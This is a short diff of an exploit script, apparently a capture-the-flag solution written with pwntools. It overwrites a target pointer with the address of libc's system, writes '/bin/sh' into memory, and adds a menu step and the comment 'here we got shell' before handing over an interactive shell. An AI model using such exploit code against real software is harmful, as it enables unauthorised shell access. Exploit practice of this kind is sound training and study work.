@@ -65,5 +65,8 @@ payload = p64(target)+p64(0x10000000000000000+(libc.sym['system']-u64(b'/bin/sh\
 write(target, payload)
 write(map,p64(u64('/bin/sh\x00')))
 
+sla('choice> ', '2')
+# here we got shell
+
 p.interactive()
 
